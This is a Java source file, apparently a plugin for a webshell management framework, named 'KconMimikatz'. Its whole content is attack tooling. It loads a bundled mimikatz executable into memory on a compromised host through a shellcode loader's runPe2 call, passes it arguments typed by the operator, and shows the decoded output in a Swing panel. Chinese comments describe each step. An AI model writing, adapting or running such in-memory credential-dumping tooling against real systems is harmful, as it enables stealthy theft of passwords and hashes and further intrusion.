package shells.plugins.kcon;

import core.annotation.PluginAnnotation;
import core.imp.Payload;
import core.imp.Plugin;
import core.shell.ShellEntity;
import shells.plugins.generic.ShellcodeLoader;
import util.functions;

import javax.swing.*;
import java.awt.event.ActionEvent;
import java.awt.event.ActionListener;

@PluginAnnotation(payloadName = "CShapDynamicPayload",Name = "KconMimikatz",DisplayName = "KconMimikatz")
public class MimikatzDemo implements Plugin {
    private JPanel corePanel;
    private JTextArea resultTextArea;
    private JTextField argsTextField;
    private JButton runButton;

    private ShellEntity shellEntity;
    private Payload payload;

    public MimikatzDemo() {
        runButton.addActionListener(new ActionListener() {
            @Override
            public void actionPerformed(ActionEvent e) {


                ShellcodeLoader loader = (ShellcodeLoader) shellEntity.getFrame().getPlugin("ShellcodeLoader"); //获得shellcode插件
                byte[] pe = functions.readInputStreamAutoClose(MimikatzDemo.class.getResourceAsStream("mimikatz-"+(payload.isX64()?"64":"32")+".exe"));//读取pe文件
                byte[] result = new byte[0];
                try {
                    result = loader.runPe2(argsTextField.getText().trim(),pe,6000);//调用loader在内存中加载Pe
                } catch (Exception exception) {
                    exception.printStackTrace();
                }
                resultTextArea.setText(shellEntity.getEncodingModule().Decoding(result));//显示输出结果
            }
        });
    }

    @Override
    public void init(ShellEntity shellEntity) {
        this.shellEntity = shellEntity;
        this.payload= shellEntity.getPayloadModel();
    }

    @Override
    public JPanel getView() {
        return corePanel;
    }
}
